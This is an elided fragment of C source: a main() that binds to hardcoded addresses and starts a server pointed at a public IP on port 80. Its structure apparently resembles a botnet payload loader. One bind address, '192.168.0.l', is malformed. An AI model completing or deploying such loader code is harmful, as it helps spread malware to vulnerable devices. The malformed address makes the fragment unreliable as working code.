...
int main(int argc, char **args)
{
    ...
    addrs[0] = inet_addr("142.93.203.111"); // Address to bind to
    addrs[1] = inet_addr("192.168.0.l"); // Address to bind to
    if (argc == 2)
    {
        id_tag = args[1];
    }
    ...
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "142.93.203.111", 80, "142.93.203.111")) == NULL)
    {
